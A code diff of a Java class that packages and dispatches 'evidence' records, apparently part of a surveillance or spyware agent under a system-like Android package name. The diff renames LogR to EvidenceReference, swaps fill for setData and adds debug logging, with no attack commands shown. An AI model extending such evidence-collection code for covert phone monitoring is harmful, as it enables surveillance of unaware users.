@@ -18,11 +18,10 @@ import com.android.networking.util.DataBuffer;
 import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class LogR.
  */
-public class LogR {
+public class EvidenceReference {
 	private static final String TAG = "LogR"; 
 
 	/** The type. */
@@ -65,7 +64,7 @@ public class LogR {
 	 * @param priority
 	 *            the priority
 	 */
-	public LogR(final int evidence) {
+	public EvidenceReference(final int evidence) {
 		final Packet p = init(evidence);
 		p.setCommand(LOG_CREATE);
 
@@ -82,7 +81,7 @@ public class LogR {
 	 * @param additional
 	 *            the additional
 	 */
-	public LogR(final int evidenceType, final byte[] additional) {
+	public EvidenceReference(final int evidenceType, final byte[] additional) {
 		final Packet p = init(evidenceType);
 		p.setCommand(LOG_CREATE);
 		p.setAdditional(additional);
@@ -103,11 +102,11 @@ public class LogR {
 	 * @param data
 	 *            the data
 	 */
-	private LogR(final int evidenceType, final byte[] additional, final byte[] data) {
+	private EvidenceReference(final int evidenceType, final byte[] additional, final byte[] data) {
 		final Packet p = init(evidenceType);
 		p.setCommand(LOG_ATOMIC);
 		p.setAdditional(additional);
-		p.fill(data);
+		p.setData(data);
 
 		hasData = true;
 
@@ -127,21 +126,18 @@ public class LogR {
 	}
 
 	public static void atomic(int evidenceType, byte[] additional, byte[] data) {
-		/*final Packet p = new Packet(Utils.getRandom());
-		p.setType(evidenceType);
-
-		p.setCommand(LOG_ATOMIC);
-		p.setAdditional(additional);
-		p.fill(data);*/
-		
-		final Packet p = new Packet(evidenceType,additional,data);
-		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (atomic)");
+		}
+		final Packet p = new Packet(evidenceType,additional,data);		
 		EvDispatcher.self().send(p);
 	}
 
 	public static void atomic(int evidenceType, ArrayList<byte[]> items) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (atomic)");
+		}
 		final Packet p = new Packet(evidenceType,items);
-
 		EvDispatcher.self().send(p);
 	}
 
@@ -174,7 +170,7 @@ public class LogR {
 		final Packet p = new Packet(unique);
 
 		p.setCommand(LOG_WRITE);
-		p.fill(data);
+		p.setData(data);
 		send(p);
 
 		hasData = true;
